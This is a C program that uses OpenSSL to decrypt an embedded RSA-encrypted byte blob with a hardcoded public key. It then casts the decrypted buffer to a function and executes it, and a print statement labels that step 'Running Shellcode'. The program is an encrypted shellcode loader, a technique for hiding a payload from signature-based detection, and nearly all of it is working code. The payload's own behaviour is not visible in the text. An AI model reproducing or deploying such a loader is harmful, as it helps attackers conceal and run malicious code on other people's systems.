//Use the below command to generate RSA keys with length of 2048.
//1
//openssl genrsa -out private.pem 2048
//Extract public key from private.pem with the following command.
//
//1
//openssl rsa -in private.pem -outform PEM -pubout -out public.pem
//public.pem is RSA public key in PEM format.
//private.pem is RSA private key in PEM format.

#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <stdio.h>

#define RUN_IT 1
//YOU MUST SET THIS VALUE TO "1" IF YOU WANT THE PROGRAM TO EXECUTE THE CODE
#define PRINT_ALL 1
//YOU MUST SET THIS VALUE TO "1" IF YOU WANT THE PROGRAM TO PRINT OUT THE CODE

//TYPICAL SETTING IS TO PRINT_ALL OR TO RUN_IT. NOT BOTH.
 
int padding = RSA_PKCS1_PADDING;
int i;
 
RSA * createRSA(unsigned char * key,int public)
{
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if(public)
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    }
    else
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    }
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}
 
int public_decrypt(unsigned char * enc_data,int data_len,unsigned char * key, unsigned char *decrypted)
{
    RSA * rsa = createRSA(key,1);
    int  result = RSA_public_decrypt(data_len,enc_data,decrypted,rsa,padding);
    return result;
}
 
void printLastError(char *msg)
{
    char * err = malloc(130);;
    ERR_load_crypto_strings();
    ERR_error_string(ERR_get_error(), err);
    printf("%s ERROR: %s\n",msg, err);
    free(err);
}
 
int main(){
 
  char encrypted[] = "\x37\x23\x6b\x87\x48\xf7\x32\x17\x54\xe2\x10\xed\x7b\xbe\x0f\x48\x82\xe7\xbf\x79\x54\xaa\x28\x6d\xed\x1d\x2f\x8d\xda\x01\x26\x03\xc5\xb1\x22\x20\xc0\x72\xbd\x24\xb1\x77\xa4\x61\x5b\x3d\x62\x0c\x59\xcc\x1e\x88\x7b\x5d\x28\xe0\xe9\x67\xf8\x22\xa7\x81\xf8\xe0\x2d\x44\xc5\x1a\x5f\x78\x99\x8f\x37\x41\x57\x42\x41\x26\x57\x4c\x41\x81\xbc\x89\xb3\x70\x59\x37\xf1\xfc\xb9\xf9\xc7\x76\x89\xb6\x99\xab\x84\x38\x87\x2f\x84\xce\x51\xbb\xf5\xdd\xc5\xf1\x65\xc7\x63\x7e\xaf\x6f\x35\xc8\xe0\x45\x88\x7b\xb1\x7c\x6e\x04\x57\xd9\x4b\xaa\x7f\x3a\x14\x74\xfa\x3f\x91\xd9\xba\x75\x50\x31\xc1\xbe\x0d\x16\xae\x9d\xe8\x69\xa0\x08\x98\x28\x97\x17\xd4\xb0\x79\xdd\x31\xad\xda\xfa\xc9\xfb\xe2\x8a\x12\xcc\x73\x6a\x72\x13\xeb\x0a\x06\xeb\xe6\x75\x77\xb5\x97\xad\xd7\xf0\x03\xab\x9c\x53\x87\x08\x74\x49\x86\xb5\xcd\xcb\x1b\xb1\x43\x46\x7c\x2a\xa6\xda\x74\x9f\x75\x10\xbf\xa0\xfe\x79\x5b\x34\x3e\x98\xa0\xbd\x1f\x18\xec\x3f\xb0\x0f\x5a\x1b\x32\xac\x21\x47\xee\x8d\x3d\xac\xc5\x0b\xba\x24\x95\x30\x86\xf2\xc9\xa7\xc5\x12\x5a\x05\x66\xeb\x5e\x72\x2a\x0c"; //key length : 2048

 char publicKey[]="-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2VN2cIeDMyJTOfPi21eS\n"\
"5P0y4xUDTp79Qhyj6L/OjvsuSH+PdcDZW4iN2iYeDTuuRU54II459BU4PC2tbV5P\n"\
"Nab04/imPTFeSD58PR63tZVGP3m1i3yVGidu1C04bgwh6NhhJ8jS58mzMXPMr2fZ\n"\
"7SKBJRvpmlBzVeKZ52wfLXwjHAiO4lDVeRJjn2xmaRpMPTQ/KcTN0If5trhZVST/\n"\
"bAm5GirQQhGi5bUS/upBI/oRiQj8WuVuEEpejQbXgzV0I9HeqNdTz3SHojzt+6al\n"\
"pYgSws09E+NFAxsdXl92dU76QvAEEdHP/7zz+SF3AMPfrXc+zRNtiXaq0WGgdImw\n"\
"AQIDAQAB\n"\
"-----END PUBLIC KEY-----\n";
  
unsigned char decrypted[4098]={};

//################## PUBLIC DECRYPT ##########################
int encrypted_length=strlen(encrypted);
#if PRINT_ALL
printf("Encrypted Length =%d\n",encrypted_length);
    printf("Encrypted message: \n");
	for (i=0; i<encrypted_length; i++) {
		printf("\\x%02x", (unsigned char)encrypted[i]);
	}
    printf("\n"); 
#endif
int decrypted_length = public_decrypt(encrypted,encrypted_length,publicKey, decrypted);
if(decrypted_length == -1)
{
    printLastError("Public Decrypt failed");
    exit(0);
}

#if PRINT_ALL
printf("PUBDEC Decrypted Length =%d\n",decrypted_length);
    printf("Decrypted message: \n");
	for (i=0; i<decrypted_length; i++) {
		printf("\\x%02x", (unsigned char)decrypted[i]);
	}
    printf("\n"); 
#endif

#if RUN_IT
  int (*ret)() = (int(*)())decrypted;
	#if PRINT_ALL
	printf("\nRunning Shellcode\n");
	#endif
  ret();
#endif

}

